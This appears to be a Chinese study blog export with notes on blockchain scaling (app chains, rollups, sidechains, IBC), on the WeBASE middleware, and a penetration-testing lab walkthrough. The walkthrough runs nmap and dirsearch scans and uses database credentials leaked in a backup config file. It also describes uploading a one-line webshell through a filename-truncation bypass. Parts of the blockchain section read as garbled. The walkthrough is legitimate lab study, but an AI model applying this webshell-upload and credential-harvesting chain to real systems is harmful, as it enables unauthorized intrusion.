<li>所有 BAYC 生态内的交易、NFT 发行、游戏运行全在 ApeChain 上完成，降低费用、提升体验。</li>
</ul>
</li>
<li><strong>Oasys 专门为游戏打造的链</strong><ul>
<li>设计为玩家免 gas 费，适合高频互动的区块链游戏环境。</li>
</ul>
</li>
</ul>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2><h2 id="📈-应用链优势"><a href="#📈-应用链优势" class="headerlink" title="📈 应用链优势"></a>📈 应用链优势</h2><ul>
<li>可以满足 <strong>Dapp 的高吞吐量要求和低费用要求</strong>，在无需许可的 Web3 环境中需要 Web2 性能的应用程序应运而生，将感应性应用作为第一实验场景。<strong>Gamefi 应用</strong>是最显性的例子，大部分 Gamefi 需要极高的吞吐量来支撑用户的实时体验与高频交互功能。</li>
<li>若 Dapp 需一种子链上存在的证明技术，那么另一种选择是构建另一条实现该技术的应用链：<ul>
<li>例子如知识证明，如 zk-Snarks 或 zk-Starks。</li>
<li>关注点是给到 Dapp 或证明用户外与构建区块无关、而是生成证明用的高效计算，并且这条链的安全性用原链来担保。</li>
</ul>
</li>
<li>Oasys 提出的应用链可以免去终端用户交互时支付 Gas 的困扰：<ul>
<li>当用户操作 Dapp 时，用户向 Dapp 支付费用，费用再由 Dapp 汇总后统一支付 Gas。</li>
</ul>
</li>
<li>应用链模式的核心思想是为了解决 Dapp 的链资源的经济没有衡量、代表处在 Dapp 中提供的经济价值的交易并以相应的形式支付给公共链的问题。<ul>
<li>代表 Dapp 经济体必不可少、代表 Dapp 经济的支付通道。</li>
</ul>
</li>
<li>垂直应用链能在 Dapp 的应用需求内应用 Dapp 的所有功能，应用链的建设交付形式灵活：<ul>
<li>Yuga Labs 将 BAYC 生态系统作为一条链的主要组成部分。</li>
<li>在项目的 NFT 收购期，BAYC 社区因此支付了巨额费用，交易数量支持他们的 <strong>ApeChain</strong> 被议论甚至使用在 <strong>BAYC 的经济体系中</strong>。</li>
</ul>
</li>
</ul>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ul>
<li>公链通用性强，但性能、费用、定制化等方面存在瓶颈；</li>
<li>DApp 越来越复杂、用户量越来越大，跑在以太坊等主链上成本太高；</li>
<li>应用链可以：<ul>
<li>降低用户使用门槛（如免 gas 费）</li>
<li>提升性能（高 TPS）</li>
<li>灵活设计规则，服务专属生态。</li>
</ul>
</li>
</ul>
<hr>
<h2 id="📉-应用链的劣势"><a href="#📉-应用链的劣势" class="headerlink" title="📉 应用链的劣势"></a>📉 应用链的劣势</h2><ul>
<li><strong>安全性在应用侧</strong>的设计上，安全性很大程度上取决于 Dapp 的采用和 Dapp 原生代币的价格。</li>
<li>跨链交互和合作，每个 Dapp 都与其他 Dapp 隔离，交互需要跨链传输或应用链交互。</li>
<li>跨链风险。</li>
</ul>
<p>在 L0 架构上，开发者的风险不会被绑定在某一条链上。当底层链发生变动时，应用几乎可以零成本地迁移到另一条链上。</p>
<h1 id="-1"><a href="#-1" class="headerlink" title=""></a></h1><h2 id="防欺诈证明（Fraud-Proof）"><a href="#防欺诈证明（Fraud-Proof）" class="headerlink" title="防欺诈证明（Fraud Proof）"></a>防欺诈证明（Fraud Proof）</h2><ul>
<li>机制：将数据重新记录</li>
<li>示例：Plasma</li>
</ul>
<p>“<strong>防欺诈证明（Fraud Proof）</strong>” 是区块链 <strong>Layer 2 扩容方案</strong> 中的重要概念，尤其出现在 <strong>Optimistic Rollup（乐观汇总）</strong> 机制中。它的核心作用是：<br> ✅ <strong>检测欺诈</strong>，✅ <strong>确保安全性</strong>，✅ <strong>防止恶意行为者提交错误的区块或交易数据</strong>。</p>
<hr>
<h4 id="📖-防欺诈证明的原理："><a href="#📖-防欺诈证明的原理：" class="headerlink" title="📖 防欺诈证明的原理："></a>📖 防欺诈证明的原理：</h4><p>在 <strong>Optimistic Rollup</strong> 中，链下批量处理了大量交易后，把交易结果直接提交到以太坊主链上，但默认“乐观”地假设这些交易都是有效的。</p>
<p>为了防止有人作恶，系统设计了 <strong>“挑战期（Challenge Period）”</strong>，在这期间：</p>
<ul>
<li><strong>任何人</strong>（通常是验证者）都可以对 Rollup 提交的交易结果发起“欺诈挑战”；</li>
<li>如果发现数据有假、状态计算有错或存在双花，就提交 <strong>Fraud Proof（欺诈证明）</strong>。</li>
</ul>
<hr>
<h4 id="⚙-举个例子："><a href="#⚙-举个例子：" class="headerlink" title="⚙ 举个例子："></a>⚙ 举个例子：</h4><p>假设有一批交易被打包上链，但里面有人试图把自己的 1 ETH 变成 10 ETH。<br> 1️⃣ 骗子把假数据提交上主链；<br> 2️⃣ 在挑战期内，有人发现了这个问题；<br> 3️⃣ 这名挑战者提交 <strong>Fraud Proof</strong>，证明那条交易有错；<br> 4️⃣ 以太坊主链验证无误后，撤销这批错误交易，并奖励挑战者。</p>
<h2 id="关于侧链（Side-Chain）"><a href="#关于侧链（Side-Chain）" class="headerlink" title="关于侧链（Side Chain）"></a>关于侧链（Side Chain）</h2><h4 id="📌-工作原理（How-does-it-work-）"><a href="#📌-工作原理（How-does-it-work-）" class="headerlink" title="📌 工作原理（How does it work?）"></a>📌 <strong>工作原理（How does it work?）</strong></h4><ul>
<li><strong>双向锚定（Two-way peg）</strong></li>
<li><strong>第三方参与（Presence of the third-party）</strong></li>
<li><strong>简单支付验证（SPV 证明）：主链锁仓，侧链使用（Simple Payment Verification proof: coins locked on the mainchain for sidechain）</strong></li>
</ul>
<hr>
<h4 id="✅-优点（Pros）"><a href="#✅-优点（Pros）" class="headerlink" title="✅ 优点（Pros）"></a>✅ <strong>优点（Pros）</strong></h4><ul>
<li><strong>提升交易吞吐量（Increase transaction throughput）</strong></li>
<li><strong>降低交易费用（Reduce transaction fee）</strong></li>
<li><strong>保持交易隐私（The privacy of the transactions can be maintained）</strong></li>
</ul>
<hr>
<h4 id="❌-缺点（Cons）"><a href="#❌-缺点（Cons）" class="headerlink" title="❌ 缺点（Cons）"></a>❌ <strong>缺点（Cons）</strong></h4><ul>
<li><strong>更中心化，由第三方控制（More centralised, controlled by third-party）</strong></li>
<li><strong>桥被多次攻击（The bridge has been hacked many times）</strong></li>
</ul>
<hr>
<h4 id="📖-总结归纳："><a href="#📖-总结归纳：" class="headerlink" title="📖 总结归纳："></a>📖 <strong>总结归纳：</strong></h4><p>这是典型的“跨链桥”或“侧链”运行机制：</p>
<ul>
<li><strong>核心机制</strong>：双向锚定 + 第三方监管 + SPV 证明</li>
<li><strong>优势</strong>：提高性能、降低费用、保护隐私</li>
<li><strong>劣势</strong>：中心化风险较高、桥容易被黑（安全性隐患）</li>
</ul>
<h2 id="Merkle-Proof-相关"><a href="#Merkle-Proof-相关" class="headerlink" title="Merkle Proof 相关"></a>Merkle Proof 相关</h2><p><em>（原文无详细内容，分类占位）</em></p>
<hr>
<h2 id="L2-扩容方案"><a href="#L2-扩容方案" class="headerlink" title="L2 扩容方案"></a>L2 扩容方案</h2><ul>
<li>将交易放在线下（L2）计算，如 <strong>State Channel</strong>。</li>
<li>只有交易始末状态在 L1 上做记录。</li>
</ul>
<h3 id="主流-L2：Rollup"><a href="#主流-L2：Rollup" class="headerlink" title="主流 L2：Rollup"></a>主流 L2：Rollup</h3><h4 id="✅-优点（Pros）-1"><a href="#✅-优点（Pros）-1" class="headerlink" title="✅ 优点（Pros）"></a>✅ <strong>优点（Pros）</strong></h4><ul>
<li>上传到主链的数据量非常少（Data posted on the mainchain is the minimum）</li>
<li>执行后的交易打包成批次上传到主链（Each batch of executed transactions is bundled and is posted on the mainchain）</li>
<li>只需要验证 Rollups 中的交易（Validate the rollups transaction required）</li>
<li>安全性更高（Much more secured）</li>
</ul>
<hr>
<h4 id="❌-缺点（Cons）-1"><a href="#❌-缺点（Cons）-1" class="headerlink" title="❌ 缺点（Cons）"></a>❌ <strong>缺点（Cons）</strong></h4><ul>
<li><strong>乐观 Rollup（Optimistic Rollups）</strong> 的主要缺点是<strong>提现时间长</strong>（A major limitation of Optimistic rollups is the longer withdrawal time）</li>
<li><strong>ZK Rollup 仍在成长和完善中</strong>（Still in the middle of maturing for zkRollup）</li>
</ul>
<h3 id="实现方式"><a href="#实现方式" class="headerlink" title="实现方式"></a>实现方式</h3><p><img src="https://s2.loli.net/2025/03/22/pKOzlZLJrCQTXEk.png" alt="1.png"></p>
<ul>
<li>在 L1 上写一个合约，主要功能：<ul>
<li>将所有要打包的交易做成一个 <strong>Merkle Tree</strong></li>
</ul>
</li>
</ul>
<h3 id="Rollup-类型"><a href="#Rollup-类型" class="headerlink" title="Rollup 类型"></a>Rollup 类型</h3><ul>
<li><strong>ZK Rollup</strong></li>
<li><strong>Optimistic Rollup（O_Rollup）</strong></li>
</ul>
<h4 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h4><p><img src="https://s2.loli.net/2025/03/22/e6lwZSDBY3IrP79.png" alt="image.png"></p>
<p>✅ <strong>ZK Rollup（Zero-Knowledge Rollup）</strong></p>
<p><strong>原理：</strong></p>
<ul>
<li>使用 <strong>零知识证明（ZK Proof）</strong>，将大量交易打包后生成一份数学证明，上传主链。</li>
<li>主链验证这份证明即可，无需验证每笔交易。</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>提现快，几乎<strong>即时到账</strong>（因为有数学证明保障）</li>
<li><strong>安全性强</strong>，难以作恶</li>
<li>数据上链少，<strong>效率高</strong></li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>技术复杂，开发难度大</li>
<li>支持的智能合约类型有限（目前难以处理复杂合约逻辑）</li>
<li>仍在完善和成熟中（如图所示）</li>
</ul>
<hr>
<p>✅ <strong>Optimistic Rollup（O_Rollup）</strong></p>
<p><strong>原理：</strong></p>
<ul>
<li>假设所有交易都是有效的（**”乐观假设”**）</li>
<li>只有在<strong>有人质疑时</strong>，才会触发欺诈证明（Fraud Proof）验证</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>支持复杂的 EVM 智能合约，兼容性好</li>
<li>技术成熟度较高，已有很多项目部署（如 Arbitrum、Optimism）</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>提现等待时间长</strong>（通常 7 天）——需要给挑战者时间提出质疑</li>
<li>安全性依赖欺诈证明机制，挑战者必须在线监督</li>
</ul>
<p><img src="https://s2.loli.net/2025/03/22/xjfaEvQ4J8OXhqR.png" alt="2.png"></p>
<hr>
<h2 id="Validium-与-Volition"><a href="#Validium-与-Volition" class="headerlink" title="Validium 与 Volition"></a>Validium 与 Volition</h2><ul>
<li><strong>Validium</strong>：计算与数据存储在线下</li>
<li><strong>Volition</strong>：更灵活的整体解决方案</li>
</ul>
<h3 id="StarkEx"><a href="#StarkEx" class="headerlink" title="StarkEx"></a>StarkEx</h3><ul>
<li><p>StarkEx 是 Validium 和 Volition 的典型实现项目</p>
<p><img src="https://s2.loli.net/2025/03/22/QRq86HGIxaYLemP.png" alt="3.png"></p>
</li>
</ul>
<p>在区块链设计中，<strong>性能（Performance）</strong>、<strong>可组合性（Composability）</strong>、<strong>去中心化（Decentralization）</strong> 三者很难同时兼顾，通常只能兼得其中两个，牺牲一个。</p>
<p><strong>三个维度代表的内容：</strong></p>
<ol>
<li><strong>Performance（性能）</strong><ul>
<li>高吞吐量、低延迟</li>
<li>代表：BSC、Polygon、xDAI（性能高，但去中心化较弱）</li>
</ul>
</li>
<li><strong>Composability（可组合性）</strong><ul>
<li>合约之间自由组合、无缝调用，DeFi 项目互通</li>
<li>代表：Uniswap、Compound、Aave、Curve（DeFi 协议）</li>
</ul>
</li>
<li><strong>Decentralization（去中心化）</strong><ul>
<li>强安全性、抗审查、真正的无中心化控制</li>
<li>代表：ZK Rollups（Starkware）、Optimism、Arbitrum</li>
</ul>
</li>
</ol>
<hr>
<p><strong>图中项目归类示例：</strong></p>
<table>
<thead>
<tr>
<th>分类</th>
<th>项目示例</th>
<th>特点</th>
</tr>
</thead>
<tbody><tr>
<td><strong>性能优先</strong></td>
<td>BSC、Polygon、xDAI</td>
<td>高吞吐，低 Gas，但中心化程度高</td>
</tr>
<tr>
<td><strong>去中心化优先</strong></td>
<td>dYdX、DeversiFi、Sorare、StarkWare ZK rollup</td>
<td>高安全、抗审查，但性能受限</td>
</tr>
<tr>
<td><strong>可组合性优先</strong></td>
<td>Uniswap、Compound、Aave、Curve</td>
<td>协议可叠加组合，DeFi 乐高，但可能性能瓶颈</td>
</tr>
<tr>
<td><strong>平衡点靠近去中心化一侧</strong></td>
<td>Optimism、Arbitrum</td>
<td>采用 Optimistic Rollup，试图兼顾可组合性和去中心化</td>
</tr>
</tbody></table>
<hr>
<h2 id="以太坊与-L2-扩展"><a href="#以太坊与-L2-扩展" class="headerlink" title="以太坊与 L2   扩展"></a>以太坊与 L2   扩展</h2><p><strong>1️⃣ Ethereum and Its Limitations（以太坊及其局限）</strong></p>
<p><strong>✨ 以太坊优点：</strong></p>
<ul>
<li>支持复杂智能合约，功能强大；</li>
<li>生态最繁荣，DeFi、NFT、DApp、GameFi 项目众多；</li>
<li>安全性极高，去中心化程度优秀。</li>
</ul>
<p><strong>⚠ 局限与瓶颈：</strong></p>
<ul>
<li><strong>TPS（每秒交易量）低</strong>：原生 L1 只有 15-30 TPS；</li>
<li><strong>Gas 费用高</strong>：网络一拥堵，交易费可达几十甚至上百美金；</li>
<li><strong>延迟高</strong>：交易确认慢，用户体验差；</li>
<li><strong>不适合高频、低价值交易场景</strong>（比如链上游戏、社交）。</li>
</ul>
<hr>
<p><strong>2️⃣ Blockchain Scaling Landscape（区块链扩容全景）</strong></p>
<p>扩容是为了提升区块链性能，降低费用，提升用户体验。区块链扩容方法大致分为两大类：</p>
<p><strong>Layer 1 扩容（直接升级主链）</strong></p>
<ul>
<li>升级共识机制（如以太坊从 PoW 转向 PoS）</li>
<li>分片（Shard）</li>
<li>优化底层架构</li>
</ul>
<p><strong>Layer 2 扩容（主流方向）</strong></p>
<ul>
<li>把计算或交易放到“主链之外”处理，再将结果提交到主链</li>
<li>保持以太坊安全性，但提高 TPS、降低费用</li>
</ul>
<hr>
<p><strong>3️⃣ Layer 2 Scaling Solutions（Layer 2 扩容方案）</strong></p>
<p>Layer2 是目前解决以太坊扩容最热门和成熟的路线。主流 Layer2 方案有：</p>
<table>
<thead>
<tr>
<th>类型</th>
<th>代表项目</th>
<th>原理</th>
<th>优点</th>
</tr>
</thead>
<tbody><tr>
<td><strong>Rollups</strong></td>
<td>Arbitrum, Optimism</td>
<td>批量打包交易后上传主链</td>
<td>安全性强，生态成熟</td>
</tr>
<tr>
<td><strong>ZK Rollups</strong></td>
<td>zkSync, StarkNet</td>
<td>零知识证明+打包</td>
<td>安全强，数据隐私好，技术门槛高</td>
</tr>
<tr>
<td><strong>Plasma</strong></td>
<td>OMG</td>
<td>定期提交子链状态</td>
<td>简单轻量，适合特定场景</td>
</tr>
<tr>
<td><strong>Validium</strong></td>
<td>Immutable X</td>
<td>类 ZK Rollup，数据不上链</td>
<td>超低费用，适合 NFT 游戏</td>
</tr>
<tr>
<td><strong>State Channels</strong></td>
<td>Celer, Raiden</td>
<td>双方链下互操作，最后上链</td>
<td>快速，适合小游戏</td>
</tr>
</tbody></table>
<hr>
<p><strong>4️⃣ The Trilemma Choice of Layer 2（Layer 2 的三难选择）</strong></p>
<p><strong>区块链三难问题（Scalability Trilemma）</strong>： </p>
<p><strong>安全性（Security）</strong> </p>
<p><strong>去中心化（Decentralization）</strong>  </p>
<p><strong>可扩展性（Scalability）</strong></p>
<p>理论上很难三者兼顾，Layer2 设计时也面临类似的选择：</p>
<table>
<thead>
<tr>
<th>选重安全</th>
<th>选重可扩展性</th>
<th>选重去中心化</th>
</tr>
</thead>
<tbody><tr>
<td>ZK Rollup</td>
<td>Validium、侧链</td>
<td>Plasma、部分 Rollup</td>
</tr>
</tbody></table>
<hr>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><table>
<thead>
<tr>
<th>模块</th>
<th>核心内容</th>
</tr>
</thead>
<tbody><tr>
<td>Ethereum and its limitations</td>
<td>以太坊性能差、贵、慢，不适合大规模应用</td>
</tr>
<tr>
<td>Blockchain scaling landscape</td>
<td>扩容方法全景：L1 扩容 vs L2 扩容</td>
</tr>
<tr>
<td>Layer 2 scaling solutions</td>
<td>主流 L2 技术：Rollup、ZK Rollup、Plasma 等</td>
</tr>
<tr>
<td>The trilemma choice of Layer 2</td>
<td>Layer2 设计必须在安全、去中心化、可扩展之间权衡</td>
</tr>
</tbody></table>
<h2 id="IBC-指数"><a href="#IBC-指数" class="headerlink" title="IBC 指数"></a>IBC 指数</h2><h4 id="什么是-IBC？"><a href="#什么是-IBC？" class="headerlink" title="什么是 IBC？"></a><strong>什么是 IBC？</strong></h4><p>IBC（Inter-Blockchain Communication Protocol）即 <strong>跨链通信协议</strong>，是 <strong>Cosmos 生态核心功能</strong>，用于连接不同的区块链（被称为“Zone”）实现：</p>
<ul>
<li>跨链资产转移</li>
<li>跨链消息传递</li>
<li>互操作性（Interoperability）</li>
</ul>
<p>Cosmos 的愿景就是通过 IBC 把不同的应用链连接起来，形成“区块链互联网”。</p>
<hr>
<h4 id="IBC-指数的含义（行业用法）"><a href="#IBC-指数的含义（行业用法）" class="headerlink" title="IBC 指数的含义（行业用法）"></a><strong>IBC 指数的含义（行业用法）</strong></h4><p><strong>IBC 指数</strong> 通常用于衡量：</p>
<ul>
<li>接入 IBC 协议的链数量</li>
<li>跨链交易次数和活跃度</li>
<li>跨链资产流通量</li>
<li>生态增长速度（比如 Cosmos Hub、Osmosis、Juno 等链的活跃程度）</li>
</ul>
<h4 id="IBC-指数的价值"><a href="#IBC-指数的价值" class="headerlink" title="IBC 指数的价值"></a><strong>IBC 指数的价值</strong></h4><table>
<thead>
<tr>
<th>优势</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>衡量 Cosmos 生态繁荣度</td>
<td>参与 IBC 的链越多，生态网络效应越强</td>
</tr>
<tr>
<td>帮助投资者和开发者决策</td>
<td>哪些链活跃、哪个 DApp 适合部署</td>
</tr>
<tr>
<td>反映真实链间交互</td>
<td>比单链交易量更能反映“跨链生态”的活跃度</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>WeBASE相关</title>
    <url>/2025/02/25/Webase/</url>
    <content><![CDATA[<h2 id="WEBASE介绍"><a href="#WEBASE介绍" class="headerlink" title="WEBASE介绍"></a>WEBASE介绍</h2><p>引入：</p>
<p><strong>中间件（Middleware）</strong>，是提供系统软件（这里指控制硬件的软件，多指操作系统）和应用软件之间<strong>连接</strong>的软件，以便于软件各部件之间的沟通，特别是应用软件对于系统软件的集中的逻辑，在现代信息技术应用框架如Web服务、面向服务的体系结构等中应用比较广泛。</p>
<p>(举例： 房屋中介 耦合 )</p>
<h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p><strong>WeBASE（WeBank Blockchain Application Software Extension）</strong>是在区块链应用和FISCO-BCOS节点之间搭建的一套通用组件。围绕交易、合约、密钥管理，数据，可视化管理来设计各个模块，开发者可以根据业务所需，选择子系统进行部署。</p>
<p>WeBASE屏蔽了区块链底层的复杂度，降低开发者的门槛，大幅提高区块链应用的开发效率，包含节点前置、节点管理、交易链路，数据导出，Web管理平台等子系统。</p>
<h3 id="整体架构"><a href="#整体架构" class="headerlink" title="整体架构"></a><strong>整体架构</strong></h3><p><img src="https://s2.loli.net/2025/02/25/yv2fQCqUm9KBtku.png" alt="1.png"></p>
<p><img src="https://s2.loli.net/2025/02/25/RyDauCIJtjbz2KY.png" alt="2.png"></p>
<p>【图片3】</p>
<h2 id="WeBASE-Front"><a href="#WeBASE-Front" class="headerlink" title="WeBASE-Front"></a><strong>WeBASE-Front</strong></h2><p>WeBASE-Front 是一个与 FISCO-BCOS 节点配合使用的子系统，主要特点如下：</p>
<ol>
<li><strong>版本支持</strong>：支持 FISCO-BCOS 2.0 及以上版本。</li>
<li><strong>集成功能</strong>：集成 web3sdk，封装接口，可通过 HTTP 请求与节点通信。</li>
<li><strong>可视化控制台</strong>：提供控制台用于开发智能合约、部署合约、发送交易，并查看交易和区块详情。</li>
<li><strong>私钥管理</strong>：支持管理私钥。</li>
<li><strong>节点监控</strong>：可监控和统计节点健康度。</li>
</ol>
<p>部署参考：</p>
<p> <a href="https://webasedoc.readthedocs.io/zh_CN/latest/docs/WeBASE-Front/install.html">https://webasedoc.readthedocs.io/zh_CN/latest/docs/WeBASE-Front/install.html</a></p>
<ol start="6">
<li><p><strong>部署要求</strong>：需要与节点同机部署。</p>
</li>
<li><p><strong>功能定位</strong>：作为 WeBASE 管理平台的前置节点服务。</p>
</li>
<li><p><strong>核心功能</strong>：</p>
</li>
</ol>
<ul>
<li>提供可视化控制台。</li>
<li>支持智能合约开发、部署和交易发送。</li>
<li>可查看交易和区块详情。</li>
</ul>
<ol start="9">
<li><strong>管理功能</strong>：</li>
</ol>
<ul>
<li>管理私钥。</li>
<li>监控和统计节点健康度。</li>
</ul>
<p><img src="https://s2.loli.net/2025/02/25/ZEmQceYfiwp9bNv.png" alt="4.png"></p>
<p><strong>设计原则包括按需部署、微服务、零耦合以及可定制四个部分</strong></p>
<p><img src="https://s2.loli.net/2025/02/25/Vi6EQFWrx5lTmaO.png" alt="5.png"></p>
<h2 id="WEBASE管理平台各模块详细介绍"><a href="#WEBASE管理平台各模块详细介绍" class="headerlink" title="WEBASE管理平台各模块详细介绍"></a>WEBASE管理平台各模块详细介绍</h2><p><img src="https://s2.loli.net/2025/02/25/GvRmqjTaL5BPUSn.png" alt="6.png"></p>
<h3 id="区块链数据概览"><a href="#区块链数据概览" class="headerlink" title="区块链数据概览"></a><strong>区块链数据概览</strong></h3><ol>
<li><p>数据概览页面，展示了区块链的核心数据指标：节点个数，区块数量，交易数量，通过管理台部署的合约数量。关键监控指标：最近有交易的7天交易量。</p>
</li>
<li><p>节点信息列表：展示了节点的ID，节点块高，节点view和运行状态。区块信息展示了最近5个块的概览信息，点击更多可以查看更多历史区块。交易信息展示了最近5个交易的概览信息，点击更多可以查看更多历史交易。</p>
</li>
</ol>
<h3 id="节点管理"><a href="#节点管理" class="headerlink" title="节点管理"></a><strong>节点管理</strong></h3><ol>
<li>节点管理主要提供了前置列表和节点列表的功能。用户可以通过新增节点前置，把新的节点前置添加到前置列表。系统会默认拉取这些前置所在的群组和各个群组的节点信息。</li>
</ol>
<h3 id="合约管理"><a href="#合约管理" class="headerlink" title="合约管理"></a><strong>合约管理</strong></h3><ol>
<li>提供了一个图形化的合约IDE环境。</li>
</ol>
<h3 id="私钥管理"><a href="#私钥管理" class="headerlink" title="私钥管理"></a><strong>私钥管理</strong></h3><ol>
<li>在私钥管理界面，可以看到合约部署和交易调用功能。这里的私钥管理可以新建私钥用户，然后拿新建用户的私钥来做合约部署和合约交易的签名。</li>
</ol>
<h3 id="系统监控"><a href="#系统监控" class="headerlink" title="系统监控"></a>系统监控</h3><p>系统监控主要包括节点监控和主机监控。节点监控主要有区块高度，pbftview，待打包交易。主机监控主要有主机的CPU，内存，网络和硬盘IO。</p>
<h3 id="交易审计"><a href="#交易审计" class="headerlink" title="交易审计"></a>交易审计</h3><p>辅助监管和审计链上的行为。</p>
<p><img src="https://s2.loli.net/2025/02/25/xZORTMGuhdBUImV.jpg" alt="7.png"></p>
<p>交易审计就是结合上面的区块链数据，私钥管理和合约管理三者的数据，以区块链数据为原材料，以私钥管理和合约管理为依据做的一个综合性的数据分析功能。交易审计提供可视化的去中心化合约部署和交易监控、审计功能，方便识别链资源被滥用的情况，为联盟链治理提供依据。</p>
<h3 id="登陆账号管理"><a href="#登陆账号管理" class="headerlink" title="登陆账号管理"></a><strong>登陆账号管理</strong></h3><h2 id="WeBASE管理平台上的智能合约开发流程"><a href="#WeBASE管理平台上的智能合约开发流程" class="headerlink" title="WeBASE管理平台上的智能合约开发流程"></a><strong>WeBASE管理平台上的智能合约开发流程</strong></h2><ol>
<li>新建账户</li>
<li>添加合约</li>
<li>部署合约</li>
<li>调用合约</li>
</ol>
]]></content>
      <tags>
        <tag>区块链</tag>
      </tags>
  </entry>
  <entry>
    <title>【学习笔记】渗透测试过程1</title>
    <url>/2024/11/06/penetration_testing_steps/</url>
    <content><![CDATA[<h2 id="1-设置网络环境"><a href="#1-设置网络环境" class="headerlink" title="1. 设置网络环境"></a>1. 设置网络环境</h2><ul>
<li><p>将 Kali 虚拟机和靶机的网络适配器改为<strong>桥接模式</strong>。</p>
</li>
<li><p>在 Kali 虚拟机和靶机相互 ping 通，确保网络连通性。</p>
</li>
<li><p>切换到 <code>root</code> 模式进行操作。</p>
</li>
<li><p>Nmap（用于信息收集 资产探测：ip存活、系统、软件、软件版本、端口）</p>
</li>
<li><p><strong>扫描网段</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.42.0/24</span><br></pre></td></tr></table></figure>
<blockquote>
<p>查看网段中存活的主机。</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/rWMvxBAIFEKR2sj.png" alt="1.png"></p>
</li>
<li><p><strong>全面扫描靶机</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -A &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在本实验获取数据库端口（1433）。</p>
</blockquote>
</li>
<li><p><strong>判断系统类型</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -O &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>在 <code>running:</code> 后面查看主机系统信息。</p>
</blockquote>
<p>【图片2】</p>
</li>
<li><p><strong>服务版本扫描(运行软件）</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -sV &lt;靶机IP&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/wKv9uQmBhrnHEVf.png" alt="3.png"></p>
</li>
<li><p><strong>端口扫描</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -p1-65535 (目标端口)&lt;靶机IP&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://s2.loli.net/2024/11/06/zKij7s6kvE9Nclt.png" alt="4.png"></p>
</li>
<li><p><strong>端口 27689 测试</strong>：扫描出异常(unknown）端口，在浏览器访问 <code>&lt;靶机IP&gt;:27689</code>。<br><img src="https://s2.loli.net/2024/11/06/ZXolz7xJqILSc2m.png" alt="5.png"></p>
</li>
<li><p><strong>随机 IP 扫描</strong>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nmap -v -iR(随机) &lt;数量&gt; -Pn -p 80</span><br></pre></td></tr></table></figure>
<blockquote>
<p>如果对方开了防火墙——（报）filtered http</p>
</blockquote>
</li>
</ul>
<h2 id="3-目录结构探测-使用-Dirsearch获取"><a href="#3-目录结构探测-使用-Dirsearch获取" class="headerlink" title="3. 目录结构探测 - 使用 Dirsearch获取"></a>3. 目录结构探测 - 使用 Dirsearch获取</h2><ul>
<li><p><strong>安装 Dirsearch</strong>，用于获取网站目录结构（取决于字典）：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://&lt;靶机IP&gt;:27689/ -I 200,302</span><br></pre></td></tr></table></figure>
<blockquote>
<p>200 和 302 表示返回的状态码。</p>
</blockquote>
<p><img src="https://s2.loli.net/2024/11/06/1QB9OferEtkwIKi.png" alt="6.png"></p>
</li>
<li><p><strong>逐步访问上述图片获取的文件</strong>，在浏览器输入 <code>http://&lt;靶机IP&gt;:27689/&lt;文件名&gt;</code>。</p>
</li>
<li><p><strong>在访问 <code>web.config.bak</code></strong> 文件，得到数据库信息：</p>
<ul>
<li>数据库 IP：192.168.61.144</li>
<li>数据库名称：FileManage</li>
<li>用户名：down</li>
<li>密码：downsql</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/06/ADWEqnZHh2kGCrK.png" alt="7.png"></p>
</li>
</ul>
<h2 id="4-数据库连接-使用-Navicat-连接"><a href="#4-数据库连接-使用-Navicat-连接" class="headerlink" title="4. 数据库连接 - 使用 Navicat 连接"></a>4. 数据库连接 - 使用 Navicat 连接</h2><ul>
<li>下载并安装 Navicat，使用上述数据库信息进行登录。</li>
<li>若连接不上，可以将 Navicat 通过 FTP 安装到虚拟机。</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/06/lJZtYUFH7S8gmAh.png" alt="8.png"></p>
<h2 id="5-网站管理"><a href="#5-网站管理" class="headerlink" title="5. 网站管理"></a>5. 网站管理</h2><ul>
<li>回到网站 <code>&lt;靶机IP&gt;:27689</code>，在用户管理模块进行操作。（登入——用户管理——管理用户）</li>
</ul>
<p><img src="https://s2.loli.net/2024/11/06/WCcwqFVEDkRtjPZ.png" alt="9.png"></p>
<h2 id="6-上传一句话木马"><a href="#6-上传一句话木马" class="headerlink" title="6. 上传一句话木马"></a>6. 上传一句话木马</h2><ul>
<li><p><strong>生成一句话木马文件</strong>，在网站下载管理模块上传文件：</p>
<p>文件命名为 <code>aaaaaaaaa.aspx.jpg</code>（利用文件名过长被截断的特性，上传后网站删除.jpg）。</p>
</li>
</ul>
<p> <img src="https://s2.loli.net/2024/11/06/opBKA5PW2vECmrj.png" alt="10.png"></p>
<p>  <strong>上传成功后，一访问就下载：无法解析函数</strong></p>
<p><img src="https://s2.loli.net/2024/11/06/hSrokxYIA3M9mbW.png" alt="11.png"></p>
<ul>
<li><p><strong>获取文件绝对路径</strong>：通过访问不存在的文件查看报错，找到路径 <code>/upfile/affix/</code>。</p>
<p><img src="https://s2.loli.net/2024/11/06/yjicEPLAVgN49XC.png" alt="12.png"></p>
</li>
</ul>
